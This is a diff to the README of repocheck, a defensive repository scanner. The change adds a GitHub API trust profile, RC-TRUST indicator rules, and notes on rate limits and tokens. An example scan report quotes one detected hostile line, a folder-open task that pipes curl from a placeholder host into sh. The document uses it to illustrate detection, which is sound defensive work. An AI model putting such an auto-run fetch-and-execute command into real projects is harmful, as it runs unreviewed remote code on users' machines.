@@ -8,7 +8,7 @@ It is built around three questions:
 | Category   | Question                                                                    |
 |------------|-----------------------------------------------------------------------------|
 | danger     | Does anything run automatically, or is something hidden, obfuscated or injected? |
-| trust      | How do the owner, stars, contributors and maintenance look? *(planned)*     |
+| trust      | How do the owner, stars, contributors and maintenance look?                 |
 | provenance | What is the repository made of, and how did it come about?                  |
 
 The result is a list of findings plus an honest list of what was **not** checked.
@@ -16,7 +16,7 @@ repocheck never says that a repository is safe.
 
 ## Status
 
-Early (version 0.1.0, milestones M1 to M3 of 5 done). What works today:
+Early (version 0.1.0, milestones M1 to M4 of 5 done). What works today:
 
 - **Local folders and public GitHub repositories.** A URL like
   `https://github.com/<owner>/<repo>` is fetched into a temporary folder as Git objects
@@ -36,6 +36,18 @@ Early (version 0.1.0, milestones M1 to M3 of 5 done). What works today:
   tool trailers, "generated with" notes and committed AI session histories. They are
   hints about how a repository came about, never a verdict: commit dates and authors
   can be set by anyone.
+- **Trust profile** (facts from the GitHub API, see [Trust](#trust-github-api)):
+  repository and owner age, account type, stars, forks, watchers, contributors,
+  commits, last commit, releases, open issues, archived/fork/template, default-branch
+  protection, the license GitHub detects, and for a local folder whether its HEAD
+  commit exists in the GitHub repository its Git remote names. `--offline` turns it off.
+- **Trust indicators** (`info` to `medium`, rules `RC-TRUST-*`): a very new owner
+  account or a very young repository with many stars, most stars within one day, a fork
+  of a much more popular repository, a release that offers programs or archives from a
+  repository with hardly any code, archived or inactive repositories, a local HEAD that
+  GitHub does not know, a manifest that names another owner's repository, and an older,
+  more popular repository with the same name and description. They are indicators,
+  never a verdict, and there is no score.
 - **Danger, six areas:** auto-run code (`autorun`), AI agent instructions and
   configuration (`agents`), obfuscated code (`obfuscation`), download-and-execute
   (`download_exec`), binaries and file-system tricks (`binaries`) and suspicious
@@ -118,7 +130,7 @@ All `scan` options:
 | `--format FORMAT`       | `text` (default), `json` or `sarif`.                                 |
 | `-o`, `--output FILE`   | Write the report to FILE instead of stdout. FILE must be outside the checked folder. |
 | `--no-color`            | Plain output without colors.                                         |
-| `--offline`             | No GitHub API queries. Accepted already; today every scan is offline (a URL target is still downloaded). |
+| `--offline`             | No GitHub API queries for the trust area (a URL target is still downloaded). |
 | `-v`, `--verbose`       | More detail.                                                         |
 
 Rule suppressions and other configuration are only taken from the command line, never
@@ -130,10 +142,10 @@ An excerpt from a real scan of a small test folder (path shortened, the URLs are
 placeholders):
 
 ```
-repocheck 0.1.0 | local folder D:\src\demo | offline | 5 files | 101 rules
+repocheck 0.1.0 | local folder D:\src\demo | offline | 5 files | 111 rules
 Lines starting with '>' are untrusted content quoted from the repository.
 
-DANGER                                   1 critical | 2 high
+DANGER                                   1 critical | 2 high | 1 medium
   CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                  confidence high
             Task starts on folder open and fetches or runs code: curl -s
             https://example.invalid/i.sh | sh
@@ -151,12 +163,12 @@ DANGER                                   1 critical | 2 high
   ...
 
 NOT CHECKED
-  - trust (GitHub API): not implemented yet (milestone 4)
+  - trust (GitHub API): no GitHub repository is known for this folder (no Git remote in .git/config)
   - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox, .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to check them (1): node_modules
   - No .git folder; the Git history was not checked
   - Dependencies are checked by name and declared source only; their code and install scripts are not checked (no registry queries) (2): package.json, requirements.txt
 
-repocheck reports only what its 101 rules detect in the checked scope.
+repocheck reports only what its 111 rules detect in the checked scope.
 A missing finding is not proof that the repository is safe.
 ```
 
@@ -172,32 +184,91 @@ repository; it is not a finding and not a quality score (same demo folder):
 
 ```
 PROVENANCE PROFILE                       facts, not findings
-  Files      5 files, 366 bytes; 5 text files with 20 lines, 0 binary
+  Files      5 files, 448 bytes; 5 text files with 22 lines, 0 binary
   Languages  TypeScript 100% (1 file)
-  Data, docs JSON (2), Text (1), Markdown (1)
-  Largest    .vscode/tasks.json (207 bytes), package.json (64 bytes),
+  Data, docs JSON (2), Markdown (1), Text (1)
+  Largest    .vscode/tasks.json (209 bytes), package.json (118 bytes),
              src/index.ts (47 bytes)
   Top level  .vscode/, src/, package.json, README.md, requirements.txt
   Present    readme
   Missing    license, tests, CI, docs, changelog, contributing guide, security
              policy, code of conduct, code owners, dependency update bot
-  License    no license file found; declared MIT (package.json)
+  License    no license file found
   Notable    editor and IDE settings (1): .vscode/tasks.json
              package manifests (2): package.json, requirements.txt
 ```
+
+## Trust (GitHub API)
+
+For a GitHub URL, and for a local folder whose `.git/config` names a GitHub repository
+as remote `origin` (or as its only remote), repocheck asks the GitHub REST API about the
+repository and its owner. The trust profile comes before the provenance profile
+(excerpt, anonymized):
+
+```
+TRUST PROFILE                            facts, not findings
+  Repository example-org/example-repo, created 2010-04-06 (16 years ago); last
+             push 2026-10-07 (22 days ago)
+  Owner      example-org (organization), account created 2016-01-17 (10 years
+             ago); 16 public repositories, 2,654 followers
+  Popularity 74,935 stars, 17,200 forks, 2,130 watchers
+  Activity   5,562 commits on main, last 2026-10-07 (22 days ago); 864
+             contributors; 38 releases, latest 3.1.3 on 2026-02-19 (2 assets);
+             4 open issues and pull requests
+  Status     not archived; not a fork; main is protected; license BSD-3-Clause
+             (GitHub); no security policy in the files
+  API        6 requests, 52 of 60 left (resets 17:46 UTC), no token
+             Stars, forks, followers and accounts can be bought or faked; these
+             are indicators, not proof.
+```
+
+- **A local folder's remote is only a claim.** Whoever prepared the folder chose it.
+  repocheck therefore looks up the folder's HEAD commit in that repository (`Local`
+  line). GitHub also finds commits that exist only in forks of the repository, so
+  "found" is no proof either.
+- **Requests:** usually 6 to 8 per scan: repository, owner, commits, contributors,
+  latest release, default branch, a name search (only for descriptions of 20 or more
+  characters), the local HEAD of a folder, the star times (one or two requests, only for
+  50 to 200 stars) and the repository a manifest names (only if it belongs to another
+  owner). Counts come from one-item pages, so large repositories cost the same. Each scan stops after 25 requests
+  without a token (100 with one) and after 60 seconds.
+- **Rate limit:** without a token GitHub allows 60 requests per hour and IP address.
+  repocheck checks the remaining requests first (that check is free), waits at most 20
+  seconds when GitHub asks for a short pause, and otherwise stops and lists what was not
+  checked under "Not checked", with the time the limit resets. The scan itself
+  continues; the exit code does not change.
+- **Token (optional):** set `GITHUB_TOKEN` or `GH_TOKEN` to raise the limit to 5,000
+  requests per hour. A fine-grained token without any permissions is enough, because
+  only public data is read. The token is sent only to `https://api.github.com`, never
+  on the command line, and never appears in reports, error messages or `-v` output.
+  The report says only whether a token was used and from which variable.
+
+  ```
+  # Bash
+  GITHUB_TOKEN=github_pat_... uv run repocheck scan https://github.com/pallets/flask
+
+  # PowerShell
+  $env:GITHUB_TOKEN = "github_pat_..."; uv run repocheck scan https://github.com/pallets/flask
+  ```
+- **What is not used:** private repositories, GraphQL, the stargazer accounts
+  themselves, and any cache (every scan asks again).
+- **Limits of the indicators:** the name search looks at the five most starred
+  repositories whose name contains the checked name; star times are only fetched for
+  50 to 200 stars; only the latest release is looked at; manifests only in the root
+  folder. Stars, accounts, dates and descriptions can all be faked.
 
 ## JSON and SARIF
 
 - **JSON** (`--format json`): tool, target, scan data, a summary per severity and
   category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
-  targets, `provenance` profile) and the disclaimer. The structure is described in
-  [docs/report.schema.json](docs/report.schema.json) (`schema_version` 1.1).
+  targets, `trust` and `provenance` profiles) and the disclaimer. The structure is described in
+  [docs/report.schema.json](docs/report.schema.json) (`schema_version` 1.2).
 - **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
   rule with title, reason, recommendation and `security-severity`; `critical`/`high`
   findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are
   relative to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution
-  notifications. Findings that concern a whole file point to line 1. The provenance
-  profile is in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub
+  notifications. Findings that concern a whole file point to line 1. The trust and
+  provenance profiles are in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub
   URL of the checked commit.
 
 Both formats contain only ASCII: text from the repository is sanitized like in the
@@ -350,6 +421,21 @@ The table below is generated from the YAML rules in `src/repocheck/rules/` with
 | RC-PROV-010 | info | Commits name an AI tool as co-author or generator |
 | RC-PROV-011 | info | Text says it was generated with an AI tool |
 | RC-PROV-012 | info | AI coding session history committed |
+
+#### Trust signals from the GitHub API (`trust`, 10 rules)
+
+| ID | Severity | Description |
+|----|----------|-------------|
+| RC-TRUST-001 | medium | Very new owner account with a popular repository |
+| RC-TRUST-002 | low | Young repository with many stars |
+| RC-TRUST-003 | low | Most stars arrived within one day |
+| RC-TRUST-004 | medium | Fork of a much more popular repository |
+| RC-TRUST-005 | medium | Release offers programs or archives, but the repository has hardly any code |
+| RC-TRUST-006 | info | Repository is archived |
+| RC-TRUST-007 | info | No commits for more than two years |
+| RC-TRUST-008 | low | Local HEAD commit not found in the named GitHub repository |
+| RC-TRUST-009 | medium | Manifest names another owner's repository as the project's source |
+| RC-TRUST-010 | medium | Older, more popular repository with the same name and description |
 <!-- rules-table:end -->
 
 Rules are data, not code: each one is a YAML entry with an ID, severity, confidence,
@@ -364,8 +450,9 @@ few false alarms; an attacker who knows the rules can avoid them.
 
 Not checked today:
 
-- **Whole areas** (planned): trust via the GitHub API (milestone 4). The report lists
-  it under "Not checked".
+- **Trust** needs the GitHub API: with `--offline`, for a folder without a GitHub
+  remote, or when the API cannot be reached or its rate limit is used up, the report
+  lists it under "Not checked" (the scan itself continues).
 - **Provenance profile:** languages are recognized by file extension or name only, and
   licenses by distinctive phrases of common license texts; neither is a code or legal
   review. A local folder's `.git` folder is not part of the profile.
@@ -415,11 +502,14 @@ code.
   with a safe loader with size and alias limits. Ruff rules (`banned-api`,
   flake8-bandit) and a self-check test forbid `subprocess`, `os.system`, `eval`, `exec`,
   `pickle` and similar in repocheck's own code.
-- **Offline analysis:** scanning a local folder makes no network connections. For a URL
-  target, the only connection is the HTTPS download from github.com (TLS verified, no
-  Git configuration, credential helpers or stored passwords are used). The test suite
-  blocks sockets to make sure of that; the clone tests use a local Git server on
-  127.0.0.1 only.
+- **Offline analysis:** the analysis of files and history makes no network connections.
+  There are only two: for a URL target the HTTPS download from github.com (TLS
+  verified, no Git configuration, credential helpers or stored passwords are used),
+  and for the trust area HTTPS requests to `api.github.com` only (no other host, no
+  redirect elsewhere, at most 1 MiB per answer, a fixed request budget per scan).
+  `--offline` switches the API off; a local folder with `--offline` makes no
+  connection at all. The test suite blocks sockets to make sure of that; API tests use
+  recorded answers, and the clone tests use a local Git server on 127.0.0.1 only.
 - **Read-only:** files are only opened for reading; nothing in the checked folder is
   changed. Symlinks, junctions and reparse points are not followed. Inside `.git/`, only
   `config`, `hooks/*` and `info/attributes` are read, as plain files.
@@ -485,8 +575,9 @@ $env:REPOCHECK_CORPUS_DIR = "C:\path\to\corpus"; uv run pytest -m corpus
   false-positive corpus.
 - **M3** *(done)*: GitHub URLs via dulwich, provenance profile from files and Git
   history, provenance indicators (`RC-PROV`).
-- **M4** *(planned)*: trust signals from the GitHub API (optional token from an
-  environment variable, `--offline` turns it off).
+- **M4** *(done)*: trust profile and trust indicators (`RC-TRUST`) from the GitHub
+  API, optional token, rate limit and request budget, checked against real
+  repositories.
 - **M5** *(planned)*: macOS and Linux support with CI, platform-specific rules, more
   ecosystems, installation with `uv tool install`.
 
